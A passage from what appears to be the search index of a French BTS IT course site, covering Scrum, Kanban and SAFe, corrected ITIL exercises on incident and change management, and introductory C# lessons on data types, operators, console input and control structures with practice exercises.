Scrum</li> <li>R\u00e9sout les blocages</li> <li>Prot\u00e8ge l'\u00e9quipe des perturbations</li> <li>Coach l'\u00e9quipe sur Scrum</li> </ul> \ud83d\udcbb \u00c9quipe de D\u00e9veloppement                  \u00c9quipe pluridisciplinaire (d\u00e9veloppeurs, testeurs, designers) qui r\u00e9alise concr\u00e8tement le produit.              <ul> <li>Auto-organis\u00e9e et pluridisciplinaire</li> <li>Estime et r\u00e9alise les user stories</li> <li>Livre un incr\u00e9ment fonctionnel</li> <li>Am\u00e9liore continuellement ses pratiques</li> </ul> \ud83d\udccb Sprint Planning 4h pour 2 semaines \ud83d\udd04 Daily Scrum 15 min/jour \ud83c\udfaf Sprint Review 2h pour 2 semaines \ud83d\udd0d Retrospective 1h30 pour 2 semaines \ud83d\udccb Kanban : Visualiser le Flux \ud83c\udfa8 Tableau Kanban              Kanban visualise le flux de travail et limite le travail en cours (WIP). Id\u00e9al pour g\u00e9rer les t\u00e2ches de maintenance, les bugs ou les projets avec des priorit\u00e9s changeantes.          \ud83d\udcdd \u00c0 Faire Cr\u00e9er la base de donn\u00e9es Concevoir l'interface utilisateur R\u00e9diger les tests unitaires \ud83d\udd04 En Cours D\u00e9velopper l'API REST Int\u00e9grer l'authentification \u2705 Termin\u00e9 Analyser les besoins Configurer l'environnement Cr\u00e9er le repository Git \ud83d\ude80 D\u00e9ploy\u00e9 Page de connexion Module de gestion utilisateurs          \ud83d\udca1 Limite WIP : Ne travaillez que sur 2-3 t\u00e2ches maximum par personne pour \u00e9viter la dispersion et am\u00e9liorer la qualit\u00e9.      \ud83d\udcdd User Stories \ud83d\udccc D\u00e9finition        Une user story d\u00e9crit une fonctionnalit\u00e9 du point de vue de l\u2019utilisateur et la valeur qu\u2019elle apporte.           \ud83d\udd39 Template : <code>En tant que &lt;r\u00f4le&gt;, je veux &lt;action&gt; afin de &lt;b\u00e9n\u00e9fice&gt;.</code>     \ud83d\udd39 Chaque story doit avoir des crit\u00e8res d\u2019acceptation : conditions pr\u00e9cises permettant de valider si la fonctionnalit\u00e9 est termin\u00e9e.     \ud83d\udd39 Bonnes pratiques : utiliser le mod\u00e8le INVEST (Ind\u00e9pendante, N\u00e9gociable, Valorisante, Estimable, Petite, Testable).         \ud83d\udca1 Exemple : \u00ab En tant qu\u2019\u00e9tudiant, je veux ajouter une t\u00e2che avec une date limite afin d\u2019organiser mes r\u00e9visions. \u00bb Crit\u00e8res d\u2019acceptation : titre obligatoire, date s\u00e9lectionnable, t\u00e2che visible dans la liste tri\u00e9e.    \ud83d\udcc2 Les Artefacts Scrum \ud83d\udccb Product Backlog        Liste prioris\u00e9e de toutes les fonctionnalit\u00e9s, am\u00e9liorations et corrections. Chaque item contient : titre, description (user story), crit\u00e8res d\u2019acceptation, estimation et priorit\u00e9.      \ud83d\uddc2\ufe0f Sprint Backlog        Sous-ensemble du product backlog s\u00e9lectionn\u00e9 pour un sprint, d\u00e9coup\u00e9 en t\u00e2ches techniques par l\u2019\u00e9quipe de d\u00e9veloppement.      \ud83d\ude80 Incr\u00e9ment        Ensemble des \u00e9l\u00e9ments \u00ab Done \u00bb \u00e0 la fin d\u2019un sprint. L\u2019incr\u00e9ment doit \u00eatre potentiellement livrable au client.      \u2705 Definition of Ready &amp; Definition of Done \ud83d\udce5 Definition of Ready (DoR)        Une user story est pr\u00eate \u00e0 entrer en sprint si :         <ul> <li>Description claire et compl\u00e8te</li> <li>Crit\u00e8res d\u2019acceptation d\u00e9finis</li> <li>Estimation r\u00e9alis\u00e9e</li> <li>D\u00e9pendances identifi\u00e9es</li> </ul> \ud83d\udce4 Definition of Done (DoD)        Une user story est consid\u00e9r\u00e9e comme termin\u00e9e si :         <ul> <li>Code compil\u00e9 et test\u00e9</li> <li>Tests unitaires \u00e9crits et pass\u00e9s</li> <li>Revue de code effectu\u00e9e</li> <li>Documentation minimale ajout\u00e9e</li> <li>Livrable d\u00e9ploy\u00e9 en environnement de test</li> </ul> \ud83d\udd27 SAFe : Scaled Agile pour Grandes Organisations \ud83c\udfe2 Scaled Agile Framework              SAFe (Scaled Agile Framework) \u00e9tend l'agilit\u00e9 aux grandes organisations avec plusieurs \u00e9quipes. Comprendre SAFe est essentiel pour travailler dans des environnements professionnels complexes.          \ud83c\udfaf Program Increment (PI)                  Cycle de 8-12 semaines synchronisant plusieurs \u00e9quipes Scrum sur des objectifs communs.              \ud83d\ude82 Agile Release Train                  Ensemble d'\u00e9quipes agiles travaillant ensemble sur une solution commune avec un rythme partag\u00e9.              \ud83d\udccb PI Planning                  \u00c9v\u00e9nement de planification de 2 jours r\u00e9unissant toutes les \u00e9quipes pour aligner les objectifs.              \ud83d\udcca Lean Portfolio                  Gestion strat\u00e9gique des investissements et allocation des ressources selon les principes Lean."},{"location":"BTS/B1/correction_td/","title":"\u2705 Corrections \u2013 Exercices ITIL","text":"<p>Ce document regroupe les corrections essentielles des exercices sur les incidents, les probl\u00e8mes et la gestion des changements ITIL. Format condens\u00e9, pr\u00eat \u00e0 l\u2019emploi pour la pr\u00e9paration ou la correction orale.</p>"},{"location":"BTS/B1/correction_td/#exercice-11-incident-ou-probleme","title":"\ud83e\udde9 Exercice 1.1 \u2013 Incident ou probl\u00e8me ?","text":"Situation Type Justification L\u2019imprimante du service comptabilit\u00e9 ne fonctionne plus Incident Panne ponctuelle, impact limit\u00e9. Tous les lundis matin, le serveur web est lent Probl\u00e8me Dysfonctionnement r\u00e9current n\u00e9cessitant une analyse. Un utilisateur ne peut plus acc\u00e9der \u00e0 son dossier personnel Incident Cas isol\u00e9, \u00e0 corriger rapidement. Analyse de la cause des pannes r\u00e9seau Probl\u00e8me Recherche de cause racine d\u2019incidents r\u00e9p\u00e9t\u00e9s. <p>\ud83d\udca1 Incident = urgence / r\u00e9action rapide Probl\u00e8me = enqu\u00eate / pr\u00e9vention des r\u00e9currences</p>"},{"location":"BTS/B1/correction_td/#exercice-12-priorisation-des-incidents","title":"\u2699\ufe0f Exercice 1.2 \u2013 Priorisation des incidents","text":"Incident Impact Urgence Priorit\u00e9 Justification Serveur de messagerie en panne (toute l\u2019entreprise) \u00c9lev\u00e9 \u00c9lev\u00e9e 1 Service critique, tout le monde impact\u00e9. Site web client inaccessible \u00c9lev\u00e9 \u00c9lev\u00e9e 2 Impact externe fort, perte potentielle de clients. Logiciel de comptabilit\u00e9 lent (fin de mois) Moyen \u00c9lev\u00e9e 3 Urgent mais impact partiel. Imprimante d\u2019un bureau en panne Faible Faible 4 Impact faible et localis\u00e9. <p>\ud83e\udde0 Priorit\u00e9 = Impact \u00d7 Urgence On traite d\u2019abord ce qui bloque le plus d\u2019utilisateurs.</p>"},{"location":"BTS/B1/correction_td/#exercice-13-escalade-des-incidents","title":"\ud83e\udded Exercice 1.3 \u2013 Escalade des incidents","text":"Incident Niveau d\u2019escalade Justification Mot de passe oubli\u00e9 Niveau 1 \u2013 Helpdesk R\u00e9solution standard, pas technique. Serveur de base de donn\u00e9es corrompu Niveau 3 \u2013 Experts Requiert comp\u00e9tences avanc\u00e9es. Bug dans un logiciel m\u00e9tier Niveau 4 \u2013 Fournisseur N\u00e9cessite correctif \u00e9diteur. Installation d\u2019un nouveau logiciel Niveau 2 \u2013 Techniciens Installation planifi\u00e9e interne. <p>\ud83d\udd01 Chaque niveau correspond \u00e0 un degr\u00e9 de technicit\u00e9 sup\u00e9rieur.</p>"},{"location":"BTS/B1/correction_td/#exercice-21-etapes-du-processus-de-gestion-des-changements","title":"\ud83d\udd27 Exercice 2.1 \u2013 \u00c9tapes du processus de gestion des changements","text":""},{"location":"BTS/B1/correction_td/#ordre-correct","title":"Ordre correct :","text":"<p>1\ufe0f\u20e3 Demande de changement 2\ufe0f\u20e3 \u00c9valuation des risques 3\ufe0f\u20e3 Approbation du changement 4\ufe0f\u20e3 Planification du changement 5\ufe0f\u20e3 Test et validation 6\ufe0f\u20e3 Impl\u00e9mentation 7\ufe0f\u20e3 R\u00e9vision post-impl\u00e9mentation</p> <p>\ud83d\udcac On ne d\u00e9ploie jamais un changement sans l\u2019avoir \u00e9valu\u00e9, approuv\u00e9 et test\u00e9.</p>"},{"location":"BTS/B1/correction_td/#exercice-22-types-de-changements","title":"\ud83e\udde9 Exercice 2.2 \u2013 Types de changements","text":"Changement Type Approbation Justification Mise \u00e0 jour de s\u00e9curit\u00e9 Windows Standard Pr\u00e9-approuv\u00e9e Proc\u00e9dure routini\u00e8re, faible risque. Migration vers un nouveau serveur Normal CAB / Direction IT Risque \u00e9lev\u00e9, planification requise. Red\u00e9marrage d\u2019urgence du serveur web Urgent Responsable IT Incident critique \u00e0 corriger imm\u00e9diatement. Ajout d\u2019un nouvel utilisateur Standard Automatique / Support Op\u00e9ration fr\u00e9quente et ma\u00eetris\u00e9e. Changement d\u2019architecture r\u00e9seau Normal CAB / Direction Impact important sur l\u2019infrastructure. <p>\ud83e\udde0 Standard = routine / Normal = planifi\u00e9 / Urgent = imm\u00e9diat</p>"},{"location":"BTS/B1/correction_td/#exercice-3-cas-dentreprise","title":"\ud83d\udcca Exercice 3 \u2013 Cas d\u2019entreprise","text":""},{"location":"BTS/B1/correction_td/#problemes-constates","title":"Probl\u00e8mes constat\u00e9s","text":"<ul> <li>Pannes r\u00e9p\u00e9t\u00e9es chaque semaine.  </li> <li>Appels directs aux techniciens.  </li> <li>Aucune documentation.  </li> <li>Changements non valid\u00e9s.</li> </ul>"},{"location":"BTS/B1/correction_td/#processus-itil-a-mettre-en-place","title":"Processus ITIL \u00e0 mettre en place","text":"Processus Objectif principal Gestion des incidents Centraliser les demandes et pannes. Gestion des probl\u00e8mes Identifier et corriger les causes r\u00e9currentes. Gestion des changements Encadrer les modifications techniques. Gestion des connaissances Documenter et partager les solutions."},{"location":"BTS/B1/correction_td/#ordre-de-mise-en-uvre","title":"Ordre de mise en \u0153uvre","text":"<ol> <li>Gestion des incidents \u2192 point d\u2019entr\u00e9e unique (outil de ticketing).  </li> <li>Gestion des probl\u00e8mes \u2192 analyse des causes profondes.  </li> <li>Gestion des changements \u2192 validation et test avant d\u00e9ploiement.  </li> <li>Gestion des connaissances \u2192 documentation et retours d\u2019exp\u00e9rience.</li> </ol>"},{"location":"BTS/B1/correction_td/#benefices-attendus","title":"B\u00e9n\u00e9fices attendus","text":"<ul> <li>Support plus efficace.  </li> <li>Moins de pannes r\u00e9currentes.  </li> <li>Changements mieux ma\u00eetris\u00e9s.  </li> <li>Capitalisation du savoir interne.</li> </ul> <p>\ud83d\udca1 L\u2019entreprise passe d\u2019une logique \u201cr\u00e9active\u201d \u00e0 une gestion \u201cpr\u00e9ventive et organis\u00e9e\u201d.</p>"},{"location":"BTS/B2/B2_1_Bases_CSharp/","title":"B2 1 Bases CSharp","text":"\ud83c\udfaf Les Bases du C# <p>D\u00e9couverte du langage de programmation C#</p> \ud83d\udcbb Qu'est-ce que le C# ? \ud83c\udfaf D\u00e9finition Fondamentale              C# (prononc\u00e9 \"C Sharp\") est un langage de programmation orient\u00e9 objet d\u00e9velopp\u00e9 par Microsoft. Il fait partie de la plateforme .NET et combine la puissance du C++ avec la simplicit\u00e9 du Visual Basic.          \ud83c\udfd7\ufe0f Orient\u00e9 Objet                  Tout est objet en C#. Le langage utilise les concepts de classes, objets, h\u00e9ritage et encapsulation.              \ud83d\udd12 Fortement Typ\u00e9                  Chaque variable doit avoir un type d\u00e9fini. Cela permet de d\u00e9tecter les erreurs d\u00e8s la compilation.              \ud83c\udf10 Multiplateforme                  Fonctionne sur Windows, Linux, macOS gr\u00e2ce \u00e0 .NET Core et .NET 5+.              \u26a1 G\u00e9r\u00e9 par le CLR                  Le Common Language Runtime g\u00e8re automatiquement la m\u00e9moire et l'ex\u00e9cution.                       \ud83d\udca1 Le saviez-vous ? C# a \u00e9t\u00e9 cr\u00e9\u00e9 en 2000 par Anders Hejlsberg, le m\u00eame d\u00e9veloppeur qui a cr\u00e9\u00e9 Turbo Pascal et Delphi !      \ud83d\udd22 Types de Donn\u00e9es Fondamentaux \ud83c\udfaf Types Num\u00e9riques              C# propose plusieurs types pour repr\u00e9senter les nombres : les entiers pour les nombres entiers et les d\u00e9cimaux pour les nombres \u00e0 virgule.          byte byte                  8 bits - 0 \u00e0 255 <code>byte age = 25;</code> int int                  32 bits - Type entier le plus courant <code>int score = 1500;</code> long long                  64 bits - Tr\u00e8s grands nombres <code>long population = 7800000000L;</code> float float                  32 bits - ~7 chiffres de pr\u00e9cision <code>float prix = 19.99f;</code> double double                  64 bits - ~15-17 chiffres de pr\u00e9cision <code>double pi = 3.14159265359;</code> decimal decimal                  128 bits - Pr\u00e9cision financi\u00e8re <code>decimal salaire = 2500.50m;</code> \ud83d\udcdd Types Texte et Caract\u00e8res              C# distingue les caract\u00e8res individuels (char) des cha\u00eenes de caract\u00e8res (string).          \ud83d\udd24 char                  Caract\u00e8re unique entre apostrophes simples. <code>char lettre = 'A';</code> \ud83d\udcc4 string                  Cha\u00eene de caract\u00e8res entre guillemets doubles. <code>string nom = \"Jean Dupont\";</code> \u2705 bool                  Valeur bool\u00e9enne : true ou false. <code>bool estMajeur = true;</code> \ud83d\udcbb Exemples de D\u00e9clarations <pre><code>// Types num\u00e9riques\nint nombre = 42;\ndouble prix = 19.99;\ndecimal salaire = 2500.50m;\n\n// Types texte\nchar lettre = 'A';\nstring message = \"Bonjour le monde !\";\n\n// Type bool\u00e9en\nbool estVrai = true;\nbool estFaux = false;</code></pre> \ud83d\udce6 Variables et D\u00e9clarations \ud83c\udfaf D\u00e9claration de Variables              En C#, chaque variable doit \u00eatre d\u00e9clar\u00e9e avec un type avant d'\u00eatre utilis\u00e9e. Vous pouvez d\u00e9clarer puis initialiser, ou faire les deux en m\u00eame temps.          \ud83d\udcdd D\u00e9claration Simple                  D\u00e9clarer une variable avec son type, puis l'initialiser s\u00e9par\u00e9ment.              \u26a1 D\u00e9claration + Initialisation                  D\u00e9clarer et initialiser une variable en une seule instruction.              \ud83d\udd04 Mot-cl\u00e9 var                  Laisser le compilateur d\u00e9duire automatiquement le type.              \ud83d\udcbb Syntaxes de D\u00e9claration <pre><code>// D\u00e9claration puis initialisation\nint nombre;\nnombre = 42;\n\n// D\u00e9claration avec initialisation\nint autreNombre = 100;\n\n// D\u00e9claration multiple\nint a, b, c;\nint x = 1, y = 2, z = 3;\n\n// Avec le mot-cl\u00e9 var (type d\u00e9duit)\nvar nom = \"Alice\";        // string\nvar age = 25;            // int\nvar prix = 19.99;        // double\nvar estActif = true;     // bool</code></pre>          \u26a0\ufe0f Attention : Avec <code>var</code>, l'initialisation est obligatoire car le compilateur doit pouvoir d\u00e9duire le type !      \ud83e\uddee Op\u00e9rateurs \ud83c\udfaf Op\u00e9rations en C#              C# propose de nombreux op\u00e9rateurs pour effectuer des calculs, des comparaisons et des op\u00e9rations logiques.          + Addition Additionne deux nombres - Soustraction Soustrait le second du premier * Multiplication Multiplie deux nombres / Division Divise le premier par le second % Modulo Reste de la division enti\u00e8re ++ Incr\u00e9mentation Ajoute 1 \u00e0 la variable \ud83d\udcbb Exemples d'Op\u00e9rations Arithm\u00e9tiques <pre><code>int a = 10, b = 3;\n\nint somme = a + b;        // 13\nint difference = a - b;   // 7\nint produit = a * b;      // 30\nint quotient = a / b;     // 3 (division enti\u00e8re)\nint reste = a % b;        // 1\n\n// Division d\u00e9cimale\ndouble quotientDecimal = (double)a / b;  // 3.333...\n\n// Incr\u00e9mentation\nint compteur = 5;\ncompteur++;              // compteur = 6\n++compteur;              // compteur = 7</code></pre> == \u00c9gal \u00e0 Compare l'\u00e9galit\u00e9 != Diff\u00e9rent de Compare la diff\u00e9rence &gt; Sup\u00e9rieur \u00e0 Compare la sup\u00e9riorit\u00e9 &lt; Inf\u00e9rieur \u00e0 Compare l'inf\u00e9riorit\u00e9 &amp;&amp; ET logique Vrai si les deux sont vrais || OU logique Vrai si au moins un est vrai \ud83d\udcbb Exemples de Comparaisons et Logique <pre><code>int age = 20;\nbool permis = true;\n\n// Comparaisons\nbool estMajeur = age &gt;= 18;           // true\nbool estMineur = age &lt; 18;            // false\n\n// Op\u00e9rateurs logiques\nbool peutConduire = age &gt;= 18 &amp;&amp; permis;  // true\nbool besoinFormation = age &lt; 18 || !permis;  // false</code></pre> \ud83d\udcac Entr\u00e9es et Sorties Console \ud83c\udfaf Interaction avec l'Utilisateur              C# utilise la classe Console pour afficher des informations et r\u00e9cup\u00e9rer les saisies de l'utilisateur.          \ud83d\udce4 Console.WriteLine                  Affiche du texte suivi d'un retour \u00e0 la ligne. M\u00e9thode principale pour l'affichage.              \ud83d\udce5 Console.ReadLine                  Lit une ligne de texte saisie par l'utilisateur. Retourne toujours une cha\u00eene.              \ud83d\udd04 Conversion de Types                  Utilise Parse() ou TryParse() pour convertir les cha\u00eenes en nombres.              \ud83d\udcbb Affichage avec Console.WriteLine <pre><code>// Affichage simple\nConsole.WriteLine(\"Bonjour le monde !\");\n\n// Affichage de variables\nstring nom = \"Alice\";\nint age = 25;\nConsole.WriteLine(\"Nom : \" + nom);\nConsole.WriteLine(\"Age : \" + age);\n\n// Interpolation de cha\u00eenes (moderne)\nConsole.WriteLine($\"Je m'appelle {nom} et j'ai {age} ans.\");\n\n// Formatage avec placeholders\nConsole.WriteLine(\"Nom : {0}, Age : {1}\", nom, age);</code></pre> \ud83d\udcbb Saisie avec Console.ReadLine <pre><code>// Saisie de texte\nConsole.Write(\"Entrez votre nom : \");\nstring nom = Console.ReadLine();\n\n// Saisie de nombres\nConsole.Write(\"Entrez votre age : \");\nstring ageTexte = Console.ReadLine();\nint age = int.Parse(ageTexte);\n\n// M\u00e9thode plus s\u00fbre avec TryParse\nConsole.Write(\"Entrez un nombre : \");\nstring input = Console.ReadLine();\nif (int.TryParse(input, out int nombre))\n{\n    Console.WriteLine($\"Vous avez saisi : {nombre}\");\n}\nelse\n{\n    Console.WriteLine(\"Ce n'est pas un nombre valide !\");\n}</code></pre>          \u26a0\ufe0f Important : <code>Console.ReadLine()</code> retourne toujours une cha\u00eene de caract\u00e8res. Pour traiter des nombres, il faut convertir avec <code>int.Parse()</code> ou <code>int.TryParse()</code>.      \ud83c\udfaf Programme Complet \ud83c\udfaf Structure d'un Programme C#              Voici un exemple complet qui utilise tous les concepts vus dans ce cours.          \ud83d\udcbb Calculatrice Simple <pre><code>using System;\n\nclass Program\n{\n    static void Main()\n    {\n        // Affichage du titre\n        Console.WriteLine(\"=== Calculatrice Simple ===\");\n\n        // Saisie du premier nombre\n        Console.Write(\"Entrez le premier nombre : \");\n        string input1 = Console.ReadLine();\n        double nombre1 = double.Parse(input1);\n\n        // Saisie du second nombre\n        Console.Write(\"Entrez le second nombre : \");\n        string input2 = Console.ReadLine();\n        double nombre2 = double.Parse(input2);\n\n        // Calculs\n        double somme = nombre1 + nombre2;\n        double difference = nombre1 - nombre2;\n        double produit = nombre1 * nombre2;\n\n        // Affichage des r\u00e9sultats\n        Console.WriteLine($\"\\nR\u00e9sultats :\");\n        Console.WriteLine($\"{nombre1} + {nombre2} = {somme}\");\n        Console.WriteLine($\"{nombre1} - {nombre2} = {difference}\");\n        Console.WriteLine($\"{nombre1} \u00d7 {nombre2} = {produit}\");\n\n        // Gestion de la division par z\u00e9ro\n        if (nombre2 != 0)\n        {\n            double quotient = nombre1 / nombre2;\n            Console.WriteLine($\"{nombre1} \u00f7 {nombre2} = {quotient:F2}\");\n        }\n        else\n        {\n            Console.WriteLine(\"Division par z\u00e9ro impossible !\");\n        }\n\n        Console.WriteLine(\"\\nAppuyez sur une touche pour quitter...\");\n        Console.ReadKey();\n    }\n}</code></pre>          \ud83c\udfaf Points cl\u00e9s \u00e0 retenir :         \u2022 Types de base : int, double, string, bool, char         \u2022 Variables : D\u00e9claration avec type explicite ou var         \u2022 Op\u00e9rateurs : Arithm\u00e9tiques, comparaison, logiques         \u2022 Console : WriteLine pour afficher, ReadLine pour saisir         \u2022 Conversion : Parse() et TryParse() pour convertir les types"},{"location":"BTS/B2/B2_2_Structures_controle/","title":"\ud83d\udd04 B2.2 - Structures de contr\u00f4le en C","text":""},{"location":"BTS/B2/B2_2_Structures_controle/#objectifs-du-cours","title":"\ud83d\udccb Objectifs du cours","text":"<p>\u00c0 la fin de ce cours, vous serez capable de : - \u2705 Utiliser les structures conditionnelles (if, else, switch) - \u2705 Ma\u00eetriser les diff\u00e9rents types de boucles (for, while, foreach) - \u2705 Contr\u00f4ler l'ex\u00e9cution avec break et continue - \u2705 Imbriquer les structures de contr\u00f4le - \u2705 Optimiser vos algorithmes</p> \ud83e\udd14 Structures conditionnelles \ud83d\udd00 Qu'est-ce qu'une condition ?  Les structures conditionnelles permettent d'ex\u00e9cuter diff\u00e9rents blocs de code selon qu'une condition est vraie ou fausse. Elles sont essentielles pour cr\u00e9er des programmes qui s'adaptent aux situations.  \ud83c\udfaf La structure if <pre><code>// Structure if simple\nint age = 20;\n\nif (age &gt;= 18)\n{\n    Console.WriteLine(\"Vous \u00eates majeur !\");\n}\n\n// if avec else\nif (age &gt;= 18)\n{\n    Console.WriteLine(\"Vous \u00eates majeur !\");\n}\nelse\n{\n    Console.WriteLine(\"Vous \u00eates mineur !\");\n}\n</code></pre> \ud83d\udd17 La structure if-else if <pre><code>int note = 85;\n\nif (note &gt;= 90)\n{\n    Console.WriteLine(\"Excellent ! Note A\");\n}\nelse if (note &gt;= 80)\n{\n    Console.WriteLine(\"Tr\u00e8s bien ! Note B\");\n}\nelse if (note &gt;= 70)\n{\n    Console.WriteLine(\"Bien ! Note C\");\n}\nelse if (note &gt;= 60)\n{\n    Console.WriteLine(\"Passable ! Note D\");\n}\nelse\n{\n    Console.WriteLine(\"\u00c9chec ! Note F\");\n}\n</code></pre> \ud83c\udf9b\ufe0f La structure switch <pre><code>// Switch classique\nint jour = 3;\n\nswitch (jour)\n{\n    case 1:\n        Console.WriteLine(\"Lundi\");\n        break;\n    case 2:\n        Console.WriteLine(\"Mardi\");\n        break;\n    case 3:\n        Console.WriteLine(\"Mercredi\");\n        break;\n    case 4:\n        Console.WriteLine(\"Jeudi\");\n        break;\n    case 5:\n        Console.WriteLine(\"Vendredi\");\n        break;\n    case 6:\n    case 7:\n        Console.WriteLine(\"Week-end !\");\n        break;\n    default:\n        Console.WriteLine(\"Jour invalide\");\n        break;\n}\n</code></pre> \ud83d\udca1 Astuce C# 8.0+ : Vous pouvez utiliser la nouvelle syntaxe switch expression pour un code plus concis !  <pre><code>// Switch expression (C# 8.0+)\nstring nomJour = jour switch\n{\n    1 =&gt; \"Lundi\",\n    2 =&gt; \"Mardi\",\n    3 =&gt; \"Mercredi\",\n    4 =&gt; \"Jeudi\",\n    5 =&gt; \"Vendredi\",\n    6 or 7 =&gt; \"Week-end\",\n    _ =&gt; \"Jour invalide\"\n};\n\nConsole.WriteLine(nomJour);\n</code></pre> \u2753 Op\u00e9rateur ternaire <pre><code>// Syntaxe : condition ? valeurSiVrai : valeurSiFaux\nint age = 20;\nstring statut = age &gt;= 18 ? \"Majeur\" : \"Mineur\";\n\n// \u00c9quivalent \u00e0 :\nstring statut2;\nif (age &gt;= 18)\n    statut2 = \"Majeur\";\nelse\n    statut2 = \"Mineur\";\n\n// Utilisation dans l'affichage\nConsole.WriteLine($\"Vous \u00eates {(age &gt;= 18 ? \"majeur\" : \"mineur\")}\");\n</code></pre> \ud83d\udd04 Les boucles \ud83d\udd01 Pourquoi utiliser des boucles ?  Les boucles permettent de r\u00e9p\u00e9ter un bloc de code plusieurs fois sans avoir \u00e0 l'\u00e9crire plusieurs fois. Elles sont essentielles pour traiter des collections de donn\u00e9es ou r\u00e9p\u00e9ter des actions.  \ud83d\udd22 La boucle for <pre><code>// Syntaxe : for (initialisation; condition; incr\u00e9mentation)\nfor (int i = 0; i &lt; 5; i++)\n{\n    Console.WriteLine($\"It\u00e9ration {i}\");\n}\n\n// Affichage des nombres pairs de 0 \u00e0 20\nfor (int i = 0; i &lt;= 20; i += 2)\n{\n    Console.WriteLine(i);\n}\n\n// Boucle d\u00e9croissante\nfor (int i = 10; i &gt;= 0; i--)\n{\n    Console.WriteLine($\"Compte \u00e0 rebours : {i}\");\n}\n</code></pre> \u23f3 La boucle while <pre><code>// Boucle while - condition test\u00e9e avant l'ex\u00e9cution\nint compteur = 0;\nwhile (compteur &lt; 5)\n{\n    Console.WriteLine($\"Compteur : {compteur}\");\n    compteur++;\n}\n\n// Exemple pratique : saisie utilisateur\nstring reponse;\ndo\n{\n    Console.Write(\"Voulez-vous continuer ? (oui/non) : \");\n    reponse = Console.ReadLine().ToLower();\n} while (reponse != \"oui\" &amp;&amp; reponse != \"non\");\n</code></pre> \ud83d\udd04 La boucle do-while <pre><code>// Boucle do-while - condition test\u00e9e apr\u00e8s l'ex\u00e9cution\nint nombre;\ndo\n{\n    Console.Write(\"Entrez un nombre entre 1 et 10 : \");\n    string input = Console.ReadLine();\n    int.TryParse(input, out nombre);\n\n    if (nombre &lt; 1 || nombre &gt; 10)\n    {\n        Console.WriteLine(\"Nombre invalide !\");\n    }\n} while (nombre &lt; 1 || nombre &gt; 10);\n\nConsole.WriteLine($\"Merci ! Vous avez saisi : {nombre}\");\n</code></pre> \ud83d\udccb La boucle foreach <pre><code>// Parcours d'un tableau\nint[] nombres = { 1, 2, 3, 4, 5 };\n\nforeach (int nombre in nombres)\n{\n    Console.WriteLine($\"Nombre : {nombre}\");\n}\n\n// Parcours d'une cha\u00eene de caract\u00e8res\nstring mot = \"Bonjour\";\nforeach (char lettre in mot)\n{\n    Console.WriteLine($\"Lettre : {lettre}\");\n}\n</code></pre> \ud83c\udfae Contr\u00f4le d'ex\u00e9cution \ud83d\uded1 L'instruction break <pre><code>// Break dans une boucle for\nfor (int i = 0; i &lt; 10; i++)\n{\n    if (i == 5)\n    {\n        Console.WriteLine(\"Arr\u00eat \u00e0 5 !\");\n        break; // Sort de la boucle\n    }\n    Console.WriteLine(i);\n}\n\n// Break dans un switch\nint choix = 2;\nswitch (choix)\n{\n    case 1:\n        Console.WriteLine(\"Option 1\");\n        break;\n    case 2:\n        Console.WriteLine(\"Option 2\");\n        break; // Obligatoire en C#\n    default:\n        Console.WriteLine(\"Option par d\u00e9faut\");\n        break;\n}\n</code></pre> \u23ed\ufe0f L'instruction continue <pre><code>// Continue dans une boucle for\nfor (int i = 0; i &lt; 10; i++)\n{\n    if (i % 2 == 0) // Si le nombre est pair\n    {\n        continue; // Passe \u00e0 l'it\u00e9ration suivante\n    }\n    Console.WriteLine($\"Nombre impair : {i}\");\n}\n\n// Affiche seulement : 1, 3, 5, 7, 9\n</code></pre> \u26a0\ufe0f Attention : <ul> <li><code>break</code> sort compl\u00e8tement de la boucle</li> <li><code>continue</code> passe \u00e0 l'it\u00e9ration suivante</li> <li>Dans les boucles imbriqu\u00e9es, ils n'affectent que la boucle la plus proche</li> </ul> \ud83c\udfd7\ufe0f Structures imbriqu\u00e9es \ud83d\udd04 Boucles imbriqu\u00e9es <pre><code>// Table de multiplication\nfor (int i = 1; i &lt;= 5; i++)\n{\n    Console.WriteLine($\"Table de {i} :\");\n    for (int j = 1; j &lt;= 10; j++)\n    {\n        Console.WriteLine($\"{i} x {j} = {i * j}\");\n    }\n    Console.WriteLine(); // Ligne vide\n}\n\n// Matrice 3x3\nfor (int ligne = 0; ligne &lt; 3; ligne++)\n{\n    for (int colonne = 0; colonne &lt; 3; colonne++)\n    {\n        Console.Write($\"[{ligne},{colonne}] \");\n    }\n    Console.WriteLine(); // Nouvelle ligne\n}\n</code></pre> \ud83e\udd14 Conditions imbriqu\u00e9es <pre><code>int age = 25;\nbool aPermis = true;\nbool aVoiture = false;\n\nif (age &gt;= 18)\n{\n    Console.WriteLine(\"Vous \u00eates majeur.\");\n\n    if (aPermis)\n    {\n        Console.WriteLine(\"Vous avez le permis.\");\n\n        if (aVoiture)\n        {\n            Console.WriteLine(\"Vous pouvez conduire votre voiture !\");\n        }\n        else\n        {\n            Console.WriteLine(\"Il vous faut une voiture.\");\n        }\n    }\n    else\n    {\n        Console.WriteLine(\"Il vous faut passer le permis.\");\n    }\n}\nelse\n{\n    Console.WriteLine(\"Vous \u00eates mineur, pas de conduite !\");\n}\n</code></pre> \ud83c\udfaf Exercices pratiques \ud83c\udfcb\ufe0f Exercice 1 : Calculateur de notes  Cr\u00e9ez un programme qui : 1. Demande le nombre d'\u00e9tudiants 2. Pour chaque \u00e9tudiant, demande sa note 3. Calcule et affiche la moyenne 4. Indique combien d'\u00e9tudiants ont eu plus de 10/20  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfcb\ufe0f Exercice 2 : Jeu de devinette  Cr\u00e9ez un jeu o\u00f9 : 1. L'ordinateur choisit un nombre al\u00e9atoire entre 1 et 100 2. L'utilisateur doit deviner le nombre 3. Le programme indique si le nombre est trop grand ou trop petit 4. Le jeu continue jusqu'\u00e0 ce que l'utilisateur trouve  <pre><code>// Indice : utilisez Random random = new Random();\n// int nombreSecret = random.Next(1, 101);\n</code></pre> \ud83c\udfcb\ufe0f Exercice 3 : Menu interactif  Cr\u00e9ez un menu qui propose : 1. Calculer l'aire d'un rectangle 2. Calculer l'aire d'un cercle 3. Convertir Celsius vers Fahrenheit 4. Quitter  Le menu doit se r\u00e9p\u00e9ter jusqu'\u00e0 ce que l'utilisateur choisisse \"Quitter\".  <pre><code>// Votre code ici\n</code></pre> \ud83c\udfcb\ufe0f Exercice 4 : Pyramide d'\u00e9toiles  Cr\u00e9ez un programme qui affiche une pyramide d'\u00e9toiles : <pre><code>    *\n   ***\n  *****\n *******\n*********\n</code></pre>  L'utilisateur doit pouvoir choisir la hauteur de la pyramide.  <pre><code>// Votre code ici\n</code></pre> \ud83d\ude80 Optimisations et bonnes pratiques \u26a1 Conseils d'optimisation   **1. 